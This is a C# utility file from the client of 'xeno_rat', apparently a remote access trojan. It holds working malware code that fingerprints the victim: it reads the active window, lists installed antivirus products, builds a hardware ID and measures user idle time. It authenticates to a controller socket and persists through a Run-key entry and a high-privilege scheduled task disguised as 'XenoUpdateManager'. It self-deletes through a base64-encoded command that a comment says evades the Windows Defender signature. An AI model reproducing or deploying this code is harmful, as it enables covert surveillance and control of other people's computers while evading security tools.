using Microsoft.Win32;
using System;
using System.CodeDom;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace xeno_rat_client
{
    public class Utils
    {

        /// <summary>
        /// Determines whether the current user is a member of the Administrator's group.
        /// </summary>
        /// <returns>True if the current user is a member of the Administrator's group; otherwise, false.</returns>
        /// <remarks>
        /// This method calls the IsUserAnAdmin function from the shell32.dll to check if the current user has administrator privileges.
        /// It returns true if the user is an administrator, and false if not.
        /// </remarks>
        [DllImport("shell32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsUserAnAdmin();

        /// <summary>
        /// Retrieves a handle to the foreground window (the window with which the user is currently working).
        /// </summary>
        /// <returns>
        /// The handle to the foreground window.
        /// </returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        /// <summary>
        /// Retrieves the text of the specified window's title bar, if it has one.
        /// </summary>
        /// <param name="hWnd">A handle to the window or control containing the text.</param>
        /// <param name="text">The buffer that will receive the text.</param>
        /// <param name="count">The maximum number of characters to copy to the buffer, including the null-terminating character.</param>
        /// <returns>If the function succeeds, the return value is the length, in characters, of the copied string, not including the null-terminating character. If the window has no title bar or text, if the title bar is empty, or if the window or control handle is invalid, the return value is zero. To get extended error information, call GetLastError.</returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        /// <summary>
        /// Retrieves the length of the text of the specified window's title bar (if it has one).
        /// </summary>
        /// <param name="hWnd">A handle to the window or control containing the text.</param>
        /// <returns>The length, in characters, of the text in the window's title bar. If the window does not exist, the return value is zero.</returns>
        /// <exception cref="Win32Exception">Thrown when an error occurs while retrieving the length of the window's title bar text.</exception>
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        /// <summary>
        /// Retrieves the identifier of the thread that created the specified window and, optionally, the identifier of the process that created the window.
        /// </summary>
        /// <param name="hWnd">A handle to the window.</param>
        /// <param name="ProcessId">When this method returns, contains the identifier of the process that created the window.</param>
        /// <returns>If the function succeeds, the return value is the identifier of the thread that created the window. If the function fails, the return value is zero.</returns>
        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        /// <summary>
        /// Retrieves the time of the last input event.
        /// </summary>
        /// <param name="plii">A reference to a LASTINPUTINFO structure that receives the time of the last input event.</param>
        /// <returns>True if the function succeeds, otherwise false.</returns>
        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        /// <summary>
        /// Closes an open object handle.
        /// </summary>
        /// <param name="hObject">A handle to an open object.</param>
        /// <returns>True if the function succeeds, false if it fails.</returns>
        /// <remarks>
        /// This method closes an open object handle.
        /// </remarks>
        [DllImport("user32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }

        /// <summary>
        /// Retrieves the caption of the active window asynchronously.
        /// </summary>
        /// <returns>A task representing the asynchronous operation. The task result contains the caption of the active window.</returns>
        /// <remarks>
        /// This method asynchronously retrieves the caption of the active window using the <see cref="GetCaptionOfActiveWindow"/> method.
        /// </remarks>
        public static async Task<string> GetCaptionOfActiveWindowAsync() 
        {
            return await Task.Run(() => GetCaptionOfActiveWindow());
        }

        /// <summary>
        /// Retrieves the caption of the active window.
        /// </summary>
        /// <returns>The caption of the active window.</returns>
        /// <remarks>
        /// This method retrieves the caption of the active window by getting the handle of the foreground window and using it to retrieve the window text.
        /// It then retrieves the process ID associated with the window and uses it to get the process information and appends it to the window caption.
        /// If an exception occurs during the process, an empty string is returned.
        /// </remarks>
        public static string GetCaptionOfActiveWindow()
        {
            string strTitle = string.Empty;
            IntPtr handle = GetForegroundWindow();
            int intLength = GetWindowTextLength(handle) + 1;
            StringBuilder stringBuilder = new StringBuilder(intLength);
            if (GetWindowText(handle, stringBuilder, intLength) > 0)
            {
                strTitle = stringBuilder.ToString();
            }
            try
            {
                uint pid;
                GetWindowThreadProcessId(handle, out pid);
                Process proc=Process.GetProcessById((int)pid);
                if (strTitle == "")
                {
                    strTitle = proc.ProcessName;
                }
                else 
                {
                    strTitle = proc.ProcessName + " - " + strTitle;
                }
                proc.Dispose();
            }
            catch 
            { 
                
            }
            return strTitle;
        }

        /// <summary>
        /// Checks if the current user is an admin and returns a boolean value indicating the result.
        /// </summary>
        /// <returns>True if the current user is an admin; otherwise, false.</returns>
        /// <remarks>
        /// This method attempts to determine if the current user is an admin by calling the IsUserAnAdmin method.
        /// If an exception occurs during the process, the method returns false.
        /// </remarks>
        public static bool IsAdmin()
        {
            bool admin = false;
            try
            {
                admin = IsUserAnAdmin();
            }
            catch { }
            return admin;
        }

        /// <summary>
        /// Retrieves the list of installed antivirus products on the local machine.
        /// </summary>
        /// <returns>A comma-separated string containing the names of installed antivirus products. If no antivirus products are found, "N/A" is returned.</returns>
        /// <remarks>
        /// This method retrieves the list of installed antivirus products by querying the WMI repository at "\\[MachineName]\root\SecurityCenter2" using the "AntivirusProduct" class.
        /// It then iterates through the retrieved instances and extracts the "displayName" property to compile a list of unique antivirus product names.
        /// If no antivirus products are found, "N/A" is returned.
        /// </remarks>
        public static string GetAntivirus()
        {
            List<string> antivirus = new List<string>();
            try
            {
                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var Instance in MOS.Get())
                    {
                        string anti = Instance.GetPropertyValue("displayName").ToString();
                        if (!antivirus.Contains(anti)) 
                        {
                            antivirus.Add(anti);
                        }
                        Instance.Dispose();
                    }
                    if (antivirus.Count == 0) 
                    {
                        antivirus.Add("N/A");
                    }   
                }
                return string.Join(", ", antivirus);
            }
            catch
            {
                if (antivirus.Count == 0)
                {
                    antivirus.Add("N/A");
                }
                return string.Join(", ", antivirus);
            }
        }

        /// <summary>
        /// Retrieves the Windows version and architecture.
        /// </summary>
        /// <returns>A string representing the Windows version and architecture in the format "Caption - OSArchitecture".</returns>
        /// <remarks>
        /// This method retrieves the Windows version and architecture by querying the Win32_OperatingSystem WMI class.
        /// It iterates through the ManagementObjectCollection to extract the "Caption" and "OSArchitecture" properties of the operating system.
        /// The retrieved information is then concatenated into a single string and returned.
        /// </remarks>
        public static string GetWindowsVersion()
        {
            string r = "";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
            {
                ManagementObjectCollection information = searcher.Get();
                if (information != null)
                {
                    foreach (ManagementObject obj in information)
                    {
                        r = obj["Caption"].ToString() + " - " + obj["OSArchitecture"].ToString();
                    }
                    information.Dispose();
                }
            }
            return r;
        }

        /// <summary>
        /// Generates a unique hardware identifier (HWID) based on various system parameters.
        /// </summary>
        /// <returns>
        /// A hashed string representing the hardware identifier.
        /// </returns>
        /// <remarks>
        /// This method concatenates the processor count, current user name, machine name, operating system version, and total size of the system drive to generate a unique hardware identifier.
        /// It then hashes the concatenated string to produce the final HWID.
        /// If any of the system parameters are unavailable or an exception occurs during the process, the method returns "UNKNOWN".
        /// </remarks>
        public static string HWID()
        {
            try
            {
                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion,new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
            }
            catch
            {
                return "UNKNOWN";
            }
        }

        /// <summary>
        /// Computes the MD5 hash of the input string and returns the first 20 characters in uppercase.
        /// </summary>
        /// <param name="strToHash">The string to be hashed.</param>
        /// <returns>The first 20 characters of the MD5 hash of <paramref name="strToHash"/> in uppercase.</returns>
        /// <remarks>
        /// This method computes the MD5 hash of the input string using the MD5CryptoServiceProvider class.
        /// It then converts the hash bytes to a hexadecimal string and returns the first 20 characters in uppercase.
        /// </remarks>
        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 20).ToUpper();
        }

        /// <summary>
        /// Connects to a socket, sets up a node with the provided key, and authenticates it asynchronously.
        /// </summary>
        /// <param name="sock">The socket to connect to.</param>
        /// <param name="key">The key used for setting up the node.</param>
        /// <param name="type">The type of authentication (default is 0).</param>
        /// <param name="ID">The ID for authentication (default is 0).</param>
        /// <param name="OnDisconnect">An action to be performed on disconnection (default is null).</param>
        /// <returns>
        /// A <see cref="Task{TResult}"/> representing the asynchronous operation. The task result contains the connected and authenticated node if successful; otherwise, it returns null.
        /// </returns>
        /// <remarks>
        /// This method connects to the provided socket, creates a new node with the given socket handler and key, and attempts to authenticate it asynchronously using the specified type and ID.
        /// If the authentication is successful, it returns the connected and authenticated node; otherwise, it returns null.
        /// </remarks>
        /// <exception cref="Exception">
        /// An exception may be thrown if there is an error during the connection, setup, or authentication process.
        /// </exception>
        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int type = 0, int ID = 0, Action<Node> OnDisconnect = null)
        {
            Node conn;
            try
            {
                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
                if (!(await conn.AuthenticateAsync(type, ID)))
                {
                    return null;
                }
            }
            catch
            {
                return null;
            }
            return conn;
        }

        /// <summary>
        /// Removes the specified executable from the startup tasks and registry keys.
        /// </summary>
        /// <param name="executablePath">The path of the executable to be removed from startup.</param>
        /// <exception cref="System.Security.SecurityException">The caller does not have the required permission.</exception>
        /// <exception cref="System.IO.IOException">An I/O error occurred.</exception>
        /// <exception cref="System.ComponentModel.Win32Exception">An error occurred when accessing the native Win32 system.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method removes the specified executable from the startup tasks by querying and deleting the task using schtasks.exe.
        /// It also removes the executable from the registry keys under SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
        /// The method runs asynchronously and returns a task representing the asynchronous operation.
        /// </remarks>
        public async static Task RemoveStartup(string executablePath) 
        {
            await Task.Run(() =>
            {
                if (Utils.IsAdmin())
                {
                    try
                    {
                        Process process = new Process();
                        process.StartInfo.FileName = "schtasks.exe";
                        process.StartInfo.Arguments = $"/query /v /fo csv";
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();
                        string output = process.StandardOutput.ReadToEnd();
                        try { process.WaitForExit(); } catch { }
                        process.Dispose();
                        string[] csv_data = output.Split('\n');
                        if (csv_data.Length > 1)
                        {
                            List<string> keys = csv_data[0].Replace("\"", "").Split(',').ToList();
                            int nameKey = keys.IndexOf("TaskName");
                            int actionKey = keys.IndexOf("Task To Run");
                            foreach (string csv in csv_data)
                            {
                                string[] items = csv.Split(new string[] { "\",\"" }, StringSplitOptions.None);
                                if (keys.Count != items.Length)
                                {
                                    continue;
                                }
                                if (nameKey == -1 || actionKey == -1)
                                {
                                    continue;
                                }

                                if (items[actionKey].Replace("\"", "").Trim() == executablePath)
                                {
                                    try
                                    {
                                        Process proc = new Process();
                                        proc.StartInfo.FileName = "schtasks.exe";
                                        proc.StartInfo.Arguments = $"/delete /tn \"{items[nameKey]}\" /f";
                                        proc.StartInfo.UseShellExecute = false;
                                        proc.StartInfo.RedirectStandardOutput = true;
                                        proc.StartInfo.CreateNoWindow = true;

                                        proc.Start();
                                        try { proc.WaitForExit(); } catch { }
                                        process.Dispose();
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                    catch { }
                }
                string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                try
                {
                    using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                    {
                        foreach (string i in key.GetValueNames())
                        {
                            if (key.GetValue(i).ToString().Replace("\"", "").Trim() == executablePath)
                            {
                                key.DeleteValue(i);
                            }
                        }
                    }
                }
                catch
                {
                }
            });

            
        }

        /// <summary>
        /// Uninstalls the application by removing it from startup, executing a command to delete the application file, and then terminates the current process.
        /// </summary>
        /// <remarks>
        /// This method removes the application from the startup, deletes the application file using a command executed in a hidden command prompt window, and then terminates the current process.
        /// </remarks>
        public async static Task Uninstall() 
        {
            // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the XenoRat windows defender sig
            await RemoveStartup(Assembly.GetEntryAssembly().Location);
            Process.Start(new ProcessStartInfo()
            {
                Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsICI=")) + Assembly.GetEntryAssembly().Location + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            Process.GetCurrentProcess().Kill();
        }

        /// <summary>
        /// Adds the specified executable to the Windows startup for the current user without requiring administrator privileges.
        /// </summary>
        /// <param name="executablePath">The full path to the executable file to be added to the startup.</param>
        /// <param name="name">The name under which the executable will be added to the startup. Default value is "XenoUpdateManager".</param>
        /// <returns>A <see cref="Task{TResult}"/> representing the asynchronous operation. The task result is <see langword="true"/> if the operation was successful; otherwise, <see langword="false"/>.</returns>
        /// <exception cref="System.Security.SecurityException">Thrown when the caller does not have the required permission to access the registry key.</exception>
        /// <exception cref="System.UnauthorizedAccessException">Thrown when the registry key cannot be opened for writing.</exception>
        /// <remarks>
        /// This method adds the specified executable to the Windows startup for the current user without requiring administrator privileges.
        /// It uses the Windows Registry to achieve this, specifically by adding a new entry under the "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" key.
        /// The <paramref name="executablePath"/> parameter should contain the full path to the executable file, and the optional <paramref name="name"/> parameter allows specifying a custom name for the startup entry.
        /// If successful, the method returns <see langword="true"/>; otherwise, it returns <see langword="false"/>.
        /// </remarks>
        public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
        {
            return await Task.Run(() =>
                   {
                        string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                        try
                        {
                            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(keyPath, true))
                            {
                                key.SetValue(name, "\"" + executablePath + "\"");
                            }
                            return true;
                        }
                        catch
                        {
                            return false;
                        }
                   });
        }

        /// <summary>
        /// Adds the specified executable to the Windows startup for all users and returns a boolean indicating success.
        /// </summary>
        /// <param name="executablePath">The path to the executable file to be added to the startup.</param>
        /// <param name="name">The name of the task to be created in the Windows Task Scheduler. Default is "XenoUpdateManager".</param>
        /// <returns>A <see cref="System.Boolean"/> value indicating whether the task was successfully added to the startup.</returns>
        /// <remarks>
        /// This method creates a new task in the Windows Task Scheduler with a logon trigger, which runs the specified executable on user logon.
        /// The task is created with the highest available privileges and interactive token logon type.
        /// The method uses schtasks.exe to create the task and checks for "SUCCESS" in the output to determine if the task was created successfully.
        /// </remarks>
        public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
        {
            try
            {
                string xmlContent = $@"
                <Task xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'>
                  <Triggers>
                    <LogonTrigger>
                      <Enabled>true</Enabled>
                    </LogonTrigger>
                  </Triggers>
                  <Principals>
                    <Principal id='Author'>
                      <LogonType>InteractiveToken</LogonType>
                      <RunLevel>HighestAvailable</RunLevel>
                    </Principal>
                  </Principals>
                  <Settings>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                  </Settings>
                  <Actions>
                    <Exec>
                      <Command>{executablePath}</Command>
                    </Exec>
                  </Actions>
                </Task>";

                string tempXmlFile = Path.GetTempFileName();
                File.WriteAllText(tempXmlFile, xmlContent);

                Process process = new Process();
                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = $"/Create /TN \"{name}\" /XML \"{tempXmlFile}\" /F";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                await Task.Delay(3000);
                string output = process.StandardOutput.ReadToEnd();

                File.Delete(tempXmlFile);

                if (output.Contains("SUCCESS"))
                {
                    return true;
                }
            }
            catch
            {
                
            }

            return false; 
        }

        /// <summary>
        /// Retrieves the system's idle time in milliseconds.
        /// </summary>
        /// <returns>The system's idle time in milliseconds.</returns>
        /// <remarks>
        /// This method asynchronously retrieves the system's idle time by running the <see cref="GetIdleTime"/> method in a separate task.
        /// The idle time represents the duration for which the system has been inactive.
        /// </remarks>
        public static async Task<uint> GetIdleTimeAsync() 
        {
            return await Task.Run(() => GetIdleTime());
        }

        /// <summary>
        /// Retrieves the number of milliseconds that have elapsed since the last input event (mouse or keyboard) was received.
        /// </summary>
        /// <returns>The number of milliseconds that have elapsed since the last input event was received.</returns>
        /// <remarks>
        /// This method retrieves the time of the last input event using the GetLastInputInfo function and calculates the idle time by subtracting it from the current system tick count obtained using Environment.TickCount.
        /// </remarks>
        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);
            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }

    }
}
